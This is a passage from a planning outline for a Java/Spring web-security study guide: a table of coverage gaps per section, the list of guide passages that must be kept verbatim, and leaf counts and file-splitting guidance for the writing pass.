| §1.10 injection family | § 9 — the SQLi mechanism, **the prepared-statement parse-then-bind explanation** (the guide's single best technical passage), the safe/unsafe Java examples, the identifiers-need-an-allowlist rule, and the related-injection list | the single unifying mechanism stated once, **the 20-row taxonomy table**, the three-part fix pattern, the exploitation classes (union/error/blind/OOB/second-order), the full safe-API list, **the unsafe-siblings list including MyBatis `${}` and `Specification` fragments**, `ProcessBuilder` argument injection, stored procedures as a partial mitigation, least-privilege DB accounts, the WAF assessment | the prepared-statement paragraph must survive **verbatim** and become the anchor of § 3.11's protocol trace |
| §1.11 XSS | § 10 — the three types, **context-aware output encoding as the primary defence**, the framework-default-and-bypass observation, allowlist sanitization over regex, `HttpOnly`, CSP, `nosniff` (all must survive) | **what an attacker actually gets from XSS**, self/blind/mXSS/uXSS, **the source→sink table**, **safe sinks as the DOM-XSS primary fix**, the five contexts enumerated, **the dangerous contexts where encoding is insufficient**, the OWASP Java Encoder API surface, Trusted Types, and **`X-XSS-Protection` being dead** | "the same string is encoded differently in HTML body, in an attribute, in a URL and inside a script block" is exactly right and needs the five encoders and the five outputs shown |
| §1.12 CSRF | § 8 — the mechanism, **the ambient-credentials rule and the justify-don't-copy framing for `csrf().disable()`**, the four defences, `Origin`/`Referer` as secondary (all strong, all must survive) | **the attacker-toolbox table** (what a form/img/fetch can and cannot do), the Lax-allowing-unsafe window, **double-submit's related-domain weakness**, **Fetch Metadata as a defence**, the custom-header defence and the preflight conditions that make it hold, **the what-does-not-defend list**, login/logout CSRF, **the proof that XSS defeats all CSRF defence**, the full Spring CSRF API surface, **the Spring Security 6 XOR/deferred changes** | the four defences are one line each for a subject with fifteen leaves |
| §1.13 CORS | § 7 — **the browser-not-server framing**, preflight, the credentials-with-`*` prohibition, "curl ignores it entirely", the Origin-reflection trap (all excellent, all must survive) | **the exact simple-request definition**, the full header table, **the seven default-exposed response headers**, `Vary: Origin`, **the sloppy-allowlist-matching bypasses**, what a CORS error means when debugging, the CORS/CSRF interaction, **the Spring two-layer surface and the filter-ordering trap**, `allowedOriginPatterns`, Private Network Access | the framing is the guide's second-best passage; the mechanics under it are one paragraph |
| §1.14 headers and CSP | § 10's one-line CSP example and `nosniff` | **the entire subject**: the full header table, **the retired-headers list**, `Referrer-Policy`'s eight values, `Permissions-Policy`, CSP delivery and policy intersection, **the complete Level 3 directive list**, **the complete source-expression list**, **why host allowlists fail**, **the strict nonce+`strict-dynamic` policy with every token justified**, nonce mechanics, hash policies, `object-src`/`base-uri`/`frame-ancestors`/`form-action`, reporting, the rollout procedure, **Trusted Types**, **SRI**, the `sandbox` token list, Spring's headers DSL | one CSP example line for what is now the most important browser-side control in the topic |
| §1.15 validation and encoding | scattered — the allowlist rule for identifiers in § 9 | **the entire subject**: validation-is-not-the-security-control framing, syntactic vs semantic, the five validation dimensions, **canonicalize-before-validate and the double-decoding bug**, Unicode hazards, server-side-only, the Bean Validation surface, records as validation-at-construction, **unknown-field rejection as anti-mass-assignment**, **store-raw-encode-on-output with the rich-text exception**, ReDoS, mass assignment, secure error messages | — |
| §1.16 secrets hygiene | § 11 — the never-list (source, git history, Dockerfiles, CI logs, app logs, URLs, client code), **rotate-don't-delete**, secrets managers, IAM roles, rotation, least privilege, gitleaks/trufflehog (all strong, all must survive) | the what-counts-as-a-secret enumeration, **environment variables' actual leak paths**, **the two-active-keys rotation requirement**, per-environment separation, key prefixes for detectability, **the ordered leak-response runbook**, the Spring config surface and `/actuator/env` | § 11 is a good list and has no mechanism under any item |
| §1.17 the catalogues | § 12 — the 2021 Top 10 table with a one-line Java framing for each row, plus the SSRF and deserialization detail (the table is strong and must survive as the 2021 reference) | **the entire 2025 list**, **the 2021→2025 diff**, the methodology and its limits, **the API Top 10:2023**, **API6 as the QuizStakes-shaped risk**, **ASVS 5.0's 17 chapters**, the other OWASP artifacts, **the CWE numbers**, **CVSS 4.0/EPSS/KEV triage**, the compliance frameworks | the guide teaches only the 2021 list, which is now a version-stale answer |
| §1.18 Spring Security orientation | absent — the guide mentions `PasswordEncoderFactories` and `http.csrf(...)` in passing | **the entire subject**: Spring Security as one filter, `DelegatingFilterProxy`, `FilterChainProxy`, **first-matching-chain**, the core domain types, `ProviderManager`, `UserDetailsService`, **`AuthorizationManager` replacing `AccessDecisionManager`**, **`ExceptionTranslationFilter` as where 401-vs-403 is decided**, `SecurityContextRepository`, the minimal config explained line by line, Boot's defaults, **method security and the self-invocation trap**, `@AuthenticationPrincipal`, **the 7.0 delta** | — |
| §2.1 master tables | none | **all six master tables**, including the attack/defence table, the credential-transport table, the token-lifetime table, the auth-mechanism decision table, the crypto-primitive table, and **the cost table against the 30/150/500 ms budgets** | — |
| §2.2 sessions vs tokens | § 2 — **the revocation-vs-scale trade stated in one sentence**, the 5–15-minute access token plus rotating refresh token, the `jti` denylist, and the `HttpOnly`-beats-`localStorage` advice (all must survive) | the emergency-denylist arithmetic, **rotation with reuse detection and the token-family model**, **the parallel-tab race**, **the five-option token-storage table with the hybrid**, **the two traps (JWT-means-no-CSRF, `HttpOnly`-stops-XSS)**, **the BFF pattern**, the browser-based-apps BCP ranking, **the QuizStakes gateway token-swap justification**, when a session is simply right, Spring Session, sliding-expiry write cost | § 2 is the guide's most efficient section and still leaves eleven leaves untouched |
| §2.3 JWT and JOSE | § 3 — the three segments, the header/payload/signature example, **"base64 is not encryption"**, the six-item validation checklist, **`alg: none`**, **RS256→HS256 confusion with the pin-the-algorithm fix**, no-tokens-in-query-strings, `kid` rotation (all excellent, all must survive) | the JWS/JWE/JWK/JWA/JWT family distinction, the signing-input construction, base64url vs base64, the JSON serialization, **the full header-parameter list as attacker input**, the registered-claim types, the eight-item checklist including `typ` and `jti`, **`jku`/`jwk`/`x5u` injection**, **`kid` injection**, **weak-HMAC-secret entropy requirements**, **substitution and cross-JWT confusion**, JSON-parsing confusion, indirect attacks via claims, nested JWE, **JWE's five parts and the `zip` pitfall**, **JWK/JWKS structure and caching mechanics**, **the key-rotation overlap window**, the algorithm-selection table, asymmetric-by-default, clock skew, **token size vs the cookie and header limits**, the library-safety assessment, **the full Spring resource-server surface**, introspection, **RFC 9068**, and what JWTs are genuinely good for | the validation checklist is the right list and each item needs its attack worked through |
| §2.4 OAuth 2.0/2.1 | § 4 — the four roles, **the five-step auth-code-plus-PKCE walk**, **what PKCE and `state` each defend**, client credentials, the implicit and ROPC deprecations with reasons (all strong, all must survive) | the delegated-authorization framing and the password anti-pattern, the endpoint list, **confidential vs public clients**, **front vs back channel as the organising idea**, the request-parameter table, the `code_verifier` requirements, **the PKCE downgrade attack**, the client-authentication methods, **the device grant**, **scopes-are-not-permissions**, **resource indicators and audience restriction**, the token-response and error-code tables, AS metadata, dynamic registration, revocation, **token exchange as the right answer for on-behalf-of calls**, **the complete OAuth 2.1 diff** | "PKCE is now recommended for all clients" must become "PKCE is **mandatory** in 2.1", and the implicit/ROPC notes must cite RFC 9700's MUST NOT |
| §2.5 OIDC | § 4's closing paragraph — the ID token, `/userinfo`, discovery, **"an ID token must never be sent to an API"** (all must survive) | **the ID token's full claim set and the ten-step validation rule**, **`nonce` vs `state`**, **`at_hash`/`c_hash`**, the three flows and `response_mode`, the standard scopes and claims, **`sub` as the only stable identifier and the email-keying account-takeover bug**, discovery's field set, **all three logout specs including back-channel logout's `logout_token` rules**, distributed logout's difficulty, **`prompt`/`max_age`/`acr_values` and step-up**, `amr`/`acr`, SSO and silent renewal, SAML in one leaf, **the full Spring OAuth2-client surface**, Spring Authorization Server | one paragraph for a spec family with nineteen leaves |
| §2.6 OAuth attacks | § 4's PKCE and `state` rationale only | **the entire subject**: RFC 9700's seventeen named attacks each as a leaf, **exact redirect-URI matching**, **open redirect chained into code theft**, **mix-up and the `iss` parameter**, code injection, **the 307 redirect**, TLS-terminating proxies, refresh-token protection, client-impersonating-resource-owner, consent clickjacking, in-browser communication flows, **DPoP**, **mTLS-bound tokens**, **PAR**, **JAR**, **RAR**, JARM, **FAPI 2.0**, CIBA, consent phishing, the browser-based-apps ranking, native-app specifics, and the QuizStakes gateway justification | — |
| §2.7 MFA and passkeys | § 13's one line ("MFA — the only defence that actually defeats a correct stolen password") | **the entire subject**: the factor categories, **the phishing-resistance ladder**, SMS's weaknesses, **TOTP's mechanics and its phishability**, HOTP, **WebAuthn's origin-binding model**, **both ceremonies step by step**, discoverable credentials, **passkeys and the synced-key consequence**, device-bound vs synced, **RP ID and Related Origin Requests**, Spring's `webAuthn()` DSL, **recovery as the weakest link**, MFA fatigue, **step-up authentication**, magic links and one-time-token login, adaptive auth, **impersonation/`SwitchUserFilter`** | the one line is correct and is the guide's entire MFA coverage |
| §2.8 authorization in depth | § 1's RBAC/ABAC/ReBAC paragraph | **the entire subject**: the seven decision points in request order, `authorizeHttpRequests` mechanics and the ordering mistake, **`PathPatternRequestMatcher` and the path-matching bypass class**, method security in depth, **`@PostAuthorize`'s side-effect problem**, `PermissionEvaluator`, **row-level security**, **OPA/Cedar/OpenFGA against the 30 ms budget**, decision caching, permission modelling, `RoleHierarchy`, **separation of duties for `PaymentRun`**, **`SecurityContext` propagation and its silent failure**, message-consumer identity, GraphQL per-field authorization, the test matrix, **the 20-roles×300-requests audit procedure** | — |
| §2.9 injection in depth | § 9's related-injection list (command, LDAP, XPath, template, log) | **the entire subject**: the exploitation ladder, **blind SQLi techniques**, second-order SQLi, **the safe dynamic-sort resolver**, `LIKE` injection, bind-parameter limits, **NoSQL operator injection**, JPQL/HQL, **SpEL injection**, **SSTI with detection payloads**, JNDI, LDAP DN-vs-filter contexts, XPath, **CRLF/response splitting**, SMTP header injection, **CSV/formula injection**, **path traversal with the canonicalize-then-verify fix**, **Zip Slip**, decompression bombs, **HTTP parameter pollution**, **prototype pollution**, **DOM clobbering**, mass assignment, **ReDoS**, **XXE with the full Java parser-hardening list**, SnakeYAML, **Jackson polymorphic typing**, and the "any feature that turns data into a class name is an RCE feature" generalisation | the five-item list is a sentence for what is now twenty-nine leaves |
| §2.10 SSRF | § 12's closing paragraph — allowlist hosts, block private ranges after DNS resolution, disable redirects, IMDSv2 (all four points correct, all must survive) | **the entire mechanism section**: the confused-deputy framing, why it is valuable, **the QuizStakes surfaces**, blind SSRF, **IMDSv2's actual design**, the case-1/case-2 split, **the full CIDR list**, **the encoding bypasses**, **DNS-based bypasses and rebinding/TOCTOU with the connect-to-validated-IP fix**, redirect chains, protocol allowlisting, **never accept a whole URL**, **the Java implementation surface**, **the egress-proxy network defence**, the webhook challenge token, and the CSRF/SSRF pairing | four bullets for eighteen leaves — the "after DNS resolution" point is exactly right and needs the rebinding sequel |
| §2.11 clickjacking | absent | **the entire subject** | — |
| §2.12 file upload | § 10's one sentence on `nosniff` and `Content-Type` | **the entire subject**: the threat list, the ordered control list, **the filename bypasses**, **SVG/HTML uploads as stored XSS**, image rewriting, document containers, **the QuizStakes identity-document flow with the blind-XSS risk**, **presigned uploads**, download-side authorization, Spring's multipart limits, temp-file handling, scanning | — |
| §2.13 deserialization | § 12's paragraph — never `ObjectInputStream.readObject()` on external input, use JSON with explicit types, disable Jackson default typing (all correct, all must survive) | **gadget chains explained**, the gadget history and ysoserial, **JEP 290's filter grammar with all four limit keywords**, **the `ObjectInputFilter` API**, **JEP 415's filter factory**, **the eight places deserialization hides in a Java stack**, the non-Java equivalents, the correct architecture, the signed-blob pattern, **the `AC ED`/`rO0` detection signature**, and the four-tier interview answer | the paragraph is right and is three sentences |
| §2.14 rate limiting and abuse | § 13 — **rate limit on the right key (per account, per IP, global)**, alert on the failure rate, HIBP k-anonymity, MFA, CAPTCHA after a threshold, **enumeration-proof responses with identical timing and the dummy-hash trick**, lockout as a double-edged tool (all excellent, all must survive) | rate limiting as a security vs capacity control, **the algorithm table**, **distributed correctness and the 3×-limit bug**, where to enforce, the `429` response contract, **stuffing vs spraying vs brute force**, **the enumeration surfaces beyond login**, timing side channels generally, **business-logic abuse and bonus farming**, bot management, **application-layer DoS beyond request count**, load shedding with the fail-closed requirement, Bucket4j/Resilience4j | § 13 is the guide's third-best section; its per-account/per-IP insight needs the algorithm and distribution mechanics under it |
| §2.15 applied cryptography | nothing beyond password hashing | **the entire subject**: use-a-construction, the property→primitive map, **AES-GCM and the nonce rule**, tag length, **the padding oracle**, **`Cipher.getInstance("AES")` being ECB**, associated data, RSA vs ECC, hybrid encryption, **envelope encryption**, key hierarchy and rotation, **HMAC and webhook signature verification**, **HKDF and one-key-one-job**, hash-function status, **`SecureRandom` and the predictable-token bug**, token entropy arithmetic, constant-time compare, what crypto does not solve, **encryption at rest's actual scope**, field-level encryption and blind indexes, tokenization vs masking, the JCA surface, the policy-file history, post-quantum | — |
| §2.16 TLS in practice | § 6's practicals (TLS 1.2 floor, HSTS, redirect, internal TLS, mTLS) | **the entire mechanism section**: the handshake narration, forward secrecy, **the five-suite fact**, **0-RTT replay**, resumption, SNI/ECH, ALPN, **the full certificate-validation algorithm**, wildcards, **why revocation fails and short-lived certs win**, **Certificate Transparency**, **pinning and HPKP's death**, **mTLS issuance/distribution/rotation and the identity model**, service-mesh mTLS's limitation, **the Java/Spring SSL-bundle surface**, **the misconfiguration checklist**, **the historic attack names**, **the disable-validation defect**, and TLS testing | — |
| §2.17 secrets and workload identity | § 11's "IAM roles / workload identity so there's no long-lived credential" | the hierarchy, **workload identity across four clouds plus SPIFFE**, **CI OIDC federation and its trust-policy misconfiguration**, **Vault dynamic secrets and secret zero**, transit/PKI engines, **KMS/HSM's non-exportability property**, envelope encryption operationally, **rotation as a design property**, the per-secret-type rotation table, Kubernetes `Secret` reality, **the Spring secret-loading surface**, `char[]` vs `String` and heap dumps, **client-side secrets do not exist** | one clause for thirteen leaves |
| §2.18 supply chain | § 12's A06 row ("unpatched libs — Dependabot/OWASP dependency-check in CI (Log4Shell)") | **the entire subject**: why it is now A03, **the twelve-item attack surface**, **the incident set including xz-utils**, **dependency confusion and the exclusive-private-repo fix**, **the Maven/Gradle repository-ordering specifics**, transitive management, **reproducible builds and checksum verification**, **SBOM and what it cannot answer**, **SLSA v1.0's build track**, **Sigstore keyless signing**, **verification at admission**, **reachability analysis**, **the triage procedure**, the update policy, dependency selection, base images and digest pinning, **CI/CD as production**, the Maven-plugin-as-arbitrary-code point, and your own disclosure policy | one table row for what OWASP now ranks third |
| §2.19 logging and error handling | § 12's A09 row ("no audit trail, so a breach goes undetected for months") | **the entire subject**: the event set, the required fields, **the never-log list with the mechanisms**, log injection and forgery, **audit-log integrity**, retention vs privacy, **the alert set**, prevention-vs-detection, **error handling as a control and A10:2025's exceptional-condition failure modes**, **fail-closed under timeout with the 30 ms QuizStakes case**, **actuator exposure**, the incident runbook, and the "how would you know?" question | one table row |
| §2.20 browser platform advanced | absent | **the entire subject**: cross-origin isolation, CORP, **XS-Leaks**, **Fetch Metadata**, `postMessage`, **service workers as persistence**, **WebSocket hijacking and the `Origin` check**, SSE, storage security, iframe sandboxing, third-party scripts and Magecart, autofill, **open redirect as a first-class bug**, `javascript:`/`data:`/`blob:` sinks, reflected file download | — |
| §2.21 HTTP-layer attacks | absent | **the entire subject**: request smuggling and its variants, the HTTP/2-downgrade reintroduction, **cache poisoning**, **cache deception**, **Host-header attacks**, response splitting, **`X-Forwarded-For` spoofing**, **403-bypass techniques**, **`StrictHttpFirewall`**, `Range`, `TRACE`, HTTP/2 rapid reset, Slowloris, GraphQL abuse | — |
| §2.22 business logic and races | absent | **the entire subject**: the class definition, **the QuizStakes-specific catalogue**, state-machine enforcement, **invariants at the lowest layer**, **races as security bugs with the single-packet technique**, the ranked fixes, TOCTOU, idempotency as a security property, numeric hazards, multi-accounting, **the 500 ms self-exclusion design**, and how to test all of it | — |
| §2.23 privacy | absent | **the entire subject** | — |
| §2.24 Spring Security config in anger | absent | **the entire subject**: multiple chains and `@Order`, `.ignoring()`'s reach, `formLogin`'s open-redirect risk, `httpBasic`, resource-server config and multi-tenant issuer resolution, **authority mapping and the claim-trust trap**, `sessionManagement`, **`exceptionHandling` and the 302-instead-of-401 question**, `logout`, **a custom filter with the `SecurityContextRepository` save**, a custom provider with the timing requirement, WebFlux differences, async propagation, **`spring-security-test`**, **debugging the filter chain**, the 6→7 migration checklist, **the seventeen-item misconfiguration catalogue** | — |
| §2.25 threat modelling | absent | **the entire subject**: the four questions, the DFD and trust boundaries, **STRIDE with QuizStakes instances**, per-element vs per-interaction, **attack trees**, DREAD's decline, the other methodologies, abuse cases, the process and output, when to model, **the worked deposit-flow threat model**, tooling, and the bridge to testable requirements | — |
| §2.26 secure SDLC and testing | absent | **the entire subject**: the gate sequence, **SAST's mechanism and blind spots**, DAST, IAST/RASP, SCA, secret scanning, IaC/container scanning, **fuzzing**, **the seven security tests worth writing**, **pentest scoping and report reading**, bug bounty, red/purple team, **the CI gate policy that survives delivery pressure**, security champions, SAMM, **the five-minute code-review checklist** | — |
| §2.27 choosing | § 1's "start with RBAC plus an ownership check" and § 2's "the standard resolution" | the twelve decision procedures as explicit flows, **when not to add a control**, and how to answer "is this secure enough?" | the two pieces of decision advice present are both correct |
| §3.1–3.4 platform internals | absent | **the entire subject**: URL parsing and parser confusion, the origin algorithms, **the registrable-domain algorithm worked**, agent clusters, site-for-cookies, **Fetch response types and the opaque-response proof**, CORB/ORB; the CORS preflight and CORS-check algorithms, **the safelist value limits**, **the forbidden-request-header list as the reason `Sec-Fetch-*` is trustworthy**, the preflight cache, **the Spring `CorsProcessor` walk and the filter-ordering proof**; **the cookie storage/retrieval/domain-match/path-match algorithms**, the prefix algorithm, the same-site determination, **the no-integrity proof**, Tomcat's cookie processor; **the CSP policy model, the fallback chain, the should-block-inline algorithm, source-expression matching, `strict-dynamic` propagation, the report object, the bypass mechanics, and what CSP cannot stop** | — |
| §3.5 Spring Security internals | absent | **the entire subject**: the auto-configuration bootstrap with the `-100` filter order, `DelegatingFilterProxy` and `FilterChainProxy` traced, **the full default filter order with each filter's job and the proof the order is forced**, `SecurityContextHolder` strategies, **the `SecurityContextHolderFilter` explicit-save change and its silent failure**, `ProviderManager` traced, **`DaoAuthenticationProvider.mitigateAgainstTimingAttack` quoted**, `AuthorizationFilter`, method-security interceptors, **`CsrfFilter` traced**, **the XOR/BREACH mechanism**, `CookieCsrfTokenRepository`, the `HeaderWriter` set, **`StrictHttpFirewall`'s reject list**, **`ExceptionTranslationFilter` and the `AuthenticationTrustResolver`**, session-fixation strategies, concurrent-session plumbing and the missing-publisher trap, remember-me formats, the OAuth2-client internals, **the resource-server decode chain and where the algorithm is pinned**, the `PasswordEncoder` formats, and **the event set as cheap telemetry** | — |
| §3.6 password hashing internals | § 5's "bcrypt's cost is a power of two", "~250ms", "memory hard blunts GPU/ASIC parallelism", "bcrypt truncates at 72 bytes" | **bcrypt's `EksBlowfish` key schedule and the `$2b$` output format**, the version prefixes, **why bcrypt is only time-hard (4 KB of state)**, the truncation traced to the key schedule, **Argon2's memory-fill/lane/pass structure and the id rationale**, **the memory-vs-time parameter proof**, **scrypt's `ROMix` and the TMTO**, **PBKDF2's iteration structure and why it is weakest**, **the attacker-economics arithmetic**, **work-factor calibration against a latency budget**, **the login-endpoint hashing DoS**, and the timing-surface decomposition | the four facts present are correct and have no mechanism behind them |
| §3.7 JOSE internals | absent | **the entire subject**: the signing-input bytes, **the verification-circularity proof**, the JWA registry, ECDSA's `r||s` encoding, **the ECDSA nonce-reuse catastrophe**, invalid-curve attacks, JWE decoded, JWK thumbprints, **Nimbus internals as Spring uses them**, **the JWKS-refresh amplification hazard**, `crit` handling, and base64url strictness | — |
| §3.8 TLS internals | absent | **the entire subject**: the 1.3 message flow with extensions, the key schedule, `CertificateVerify`, downgrade protection, RSA key transport's removal, the record layer, **path building vs validation**, **the X.509 extension set**, name constraints, **JSSE's `X509ExtendedTrustManager` and the hostname-verification separation**, the `java.security` policy properties, session caching, and server-side mTLS traced | — |
| §3.9 crypto internals | absent | **the entire subject**: AES-GCM's construction, **the nonce-reuse forgery proof**, the birthday bound, **the padding-oracle walk**, the MAC-ordering proof, **HMAC and length extension**, **the CRIME/BREACH mechanism as the reason Spring masks the CSRF token**, `SecureRandom`'s SPI and properties, **the `java.util.Random` predictability proof**, token-entropy arithmetic, deterministic-encryption leakage, key commitment, and remote-timing feasibility | — |
| §3.10 deserialization internals | absent | **the entire subject**: the stream format bytes, **what `readObject` invokes**, **the `hashCode`-triggered chain**, **a gadget chain traced link by link**, `TemplatesImpl`, **the filter's invocation points**, **the pattern grammar with evaluation order**, the JEP 415 factory contract, **why a filter is containment**, **JNDI injection internals with the `trustURLCodebase` flags**, the local-gadget variants, and records as a safety property | — |
| §3.11 SQL injection internals | § 9's parse-then-bind sentence | **the PostgreSQL extended-query-protocol trace**, **MySQL's `useServerPrepStmts` and client-side substitution**, the charset bugs, the plan cache as a separate concern, Hibernate's parameter path, **`allowMultiQueries` as the escalation flag**, stored-procedure internals, database-side containment, and detection via `pg_stat_statements` | the one sentence is the guide's best line and needs the wire trace behind it |
| §3.12 real incidents | § 12's Log4Shell mention in the A06 row | **all thirteen leaves**: Log4Shell traced with the version matrix and the follow-on CVEs, **Spring4Shell traced with both preconditions**, the Spring Cloud Function SpEL CVE, the `jackson-databind` family, Heartbleed, Equifax, SolarWinds, xz-utils, the MFA-fatigue incidents, Capital One's SSRF→IMDS, and **how to use an incident in an interview** | a parenthetical |
| §3.13 proofs | none — the guide asserts throughout, correctly but without argument | **all 64 proofs** | — |
| §3.14 failure catalogue | symptoms scattered as traps | a consolidated **38-entry** symptom → cause → diagnostic → fix catalogue with the real error text | — |
| §3.15 security observability | absent | the metric set, **the Spring-events listener**, Micrometer with the cardinality trap, tracing, runtime inspection, the synthetic probe, the two operational alarms, and the dashboard | — |
| §3.16 version history | § 12's "(2021)" label and § 5's NIST 800-63B pointer | **the entire subject**: the browser-platform, OAuth, JWT, TLS, password-guidance, Java-security, Spring-Security and OWASP timelines, and how to answer a version question honestly | the guide is dated to 2021/2026 in places and stale in others; this section is what fixes that permanently |
| §4 build it | § 5's `PasswordEncoderFactories` line, § 9's three query examples, § 10's CSP example — all correct, all fragments | **all 69 implementations and their 69 Diff-vs-the-real-one tables** | every existing fragment must be absorbed and completed, and re-domained onto QuizStakes types |
| §5 interview and retention | the 27-item atomic checklist (strong, must be carried forward **expanded**, never trimmed) | **the 80 questions with answer shapes across six sets**, **the 100-item trap list**, the cheat sheet, the reproduced master tables, the two decision trees, the fifteen numbers, the three-axis drills, the scripted 60-second answers, and the anti-checklist | — |

### Must survive verbatim (or verbatim-plus-expansion)

These passages are the current guide's best work and the bible must keep the exact framing:

1. **The opening paragraph** — "Security answers are graded on mechanism. 'Use bcrypt' earns
   nothing; 'bcrypt is deliberately slow with a tunable cost factor and a per-password salt, so an
   attacker with the dump can't run a fast GPU dictionary attack, and identical passwords don't
   produce identical hashes' earns the point." This is the thesis of the whole file.
2. **§ 1's IDOR paragraph** — "the code checked 'is logged in' but never 'does this invoice belong
   to this user'… `findByIdAndUserId(...)`, not `findById(...)` followed by a forgotten check."
3. **§ 2's one-sentence sessions-vs-tokens trade** — "Cannot be revoked before expiry without
   reintroducing state. That's the whole trade-off."
4. **§ 3's "The payload is base64, not encryption — anyone can read it."**
5. **§ 3's algorithm-confusion paragraph and its fix sentence** — "pin the expected algorithm at
   verification time, never read it from the token."
6. **§ 4's PKCE purpose paragraph** — the malicious-app-same-URI-scheme and referer-leak framing.
7. **§ 4's OIDC distinction** — "the ID token is for the client to learn who logged in and must
   never be sent to an API as authorization. 'Log in with Google' is OIDC. 'Let this app read your
   Google Drive' is OAuth 2."
8. **§ 5's encryption-is-wrong argument** — "reversible… there is no legitimate reason to ever
   recover a user's password; 'email me my password' is a design defect."
9. **§ 5's work-factor sentence** — "The legitimate user pays 250ms once; the attacker pays it per
   guess."
10. **§ 6's TLS three-guarantees paragraph** — "It gives you *nothing* about who the client is, and
    nothing about the safety of the payload."
11. **§ 6's "network segmentation is not a boundary — assume the network is hostile."**
12. **§ 7's CORS framing** — "CORS does not protect your server. `curl`, Postman, and any
    server-side client ignore it entirely… CORS only governs whether *browser JavaScript* may read
    the response. Authorization is what protects the API."
13. **§ 7's Origin-reflection trap** — "That's equivalent to `*`-with-credentials and hands any site
    full authenticated access."
14. **§ 8's ambient-credentials rule** — "CSRF only applies to ambient credentials… This is the
    reasoning behind `http.csrf(csrf -> csrf.disable())` on a stateless token API — and you must be
    able to justify it, not just copy it."
15. **§ 9's prepared-statement mechanism** — "the SQL text with `?` placeholders is sent to the
    database and **parsed into a query plan first**; parameter values are then bound as *data* to
    that already-fixed plan. There is no path by which a value becomes syntax. This is categorically
    different from escaping, which is a blocklist you can get wrong."
16. **§ 9's identifier rule** — "table names, column names, and `ORDER BY` direction are not
    parameterizable — they're part of the syntax."
17. **§ 10's five-context sentence** — "The same string is encoded differently in HTML body, in an
    attribute, in a URL, and inside a `<script>` block."
18. **§ 10's framework-bypass observation** — "the vulnerabilities appear where you bypass them
    (`th:utext`, `dangerouslySetInnerHTML`, jQuery `.html()`)."
19. **§ 11's rotate-don't-delete rule** — "a deleted secret is still in the history — **rotate it,
    don't just delete the line**."
20. **§ 12's SSRF sentence** — "block link-local/private ranges *after* DNS resolution (a hostname
    can resolve to `127.0.0.1`)."
21. **§ 13's rate-limit-key insight** — "Per-IP alone is useless against a botnet spreading one
    attempt per IP… alert on a spike in the *failure rate*, which is the real signal."
22. **§ 13's enumeration paragraph** — the same-message-and-same-timing rule with the dummy-hash
    mechanism.
23. **§ 13's lockout warning** — "account lockout is a double-edged tool — it turns credential
    stuffing into a denial of service against your own users."
24. **The entire 27-item atomic concept checklist**, carried forward and expanded, never trimmed.

---

## Footer

**Leaf counts per part**

| Part | Sections | Leaves |
|---|---|---|
| PART 1 — BASICS | 18 (§1.1–§1.18) | **280** |
| PART 2 — INTERMEDIATE | 27 (§2.1–§2.27) | **463** |
| PART 3 — UNDER THE HOOD | 16 (§3.1–§3.16) | **262** |
| PART 4 — BUILD IT | 8 (§4.1–§4.8) | **69** |
| PART 5 — INTERVIEW & RETENTION | 3 (§5.1–§5.3) | **117** |
| **Total** | **72 sections** | **1,191 leaves** |

**Tag counts (approximate, for the write pass's planning)**

| Tag | Leaves carrying it |
|---|---|
| `[RESEARCH]` | **63** — every one must be re-verified against its cited source before the bible states it |
| `[VERSION-TRAP]` | **41** |
| `[PROVE]` | **~210**, of which 64 are the dedicated proofs in § 3.13 |
| `[BUILD]` | **69** in PART 4, plus 14 embedded in Parts 1–3 |
| `[TRAP]` | **~150**, of which 100 are the consolidated list in § 5.2 |
| `[SOURCE]` | **~55** |
| `[ATTACK]` | **~70** |
| `[CVE]` | **~20** |
| `[X-REF nn]` | **~45**, covering guides 03, 04, 05, 06, 07, 08, 09, 10, 12, 14, 15, 16, 17, 18, 19, 20, 22 |

**Write-pass guidance.** At 1,191 leaves this topic will exceed 2,500 lines. Split as:

- `src/topics/13-web-security.md` — PARTS 1–2 (§1.1–§2.27, 743 leaves)
- `src/topics/13-web-security-internals.md` — PARTS 3–5 (§3.1–§5.3, 448 leaves)

Cross-link both at the top, keep an `## Atomic concept checklist` in **each** file (downstream
agents parse it), and add the new file to `src/topics/00-index.md` with its own scope line.

**Target version statement for the bible's header.** "Written against OWASP Top 10:2025 and
Top 10:2021, OWASP API Security Top 10:2023, OWASP ASVS 5.0.0, RFC 9110/9700/8725/6265bis/8446,
CSP Level 3, WHATWG Fetch, OAuth 2.1 draft-13, OIDC Core 1.0, WebAuthn Level 3, NIST SP 800-63B-4,
Java 21, and Spring Boot 3.5.x / Spring Security 6.5.x with the Spring Security 7.0 delta called
out at every affected leaf. Checked 2026-09-03."



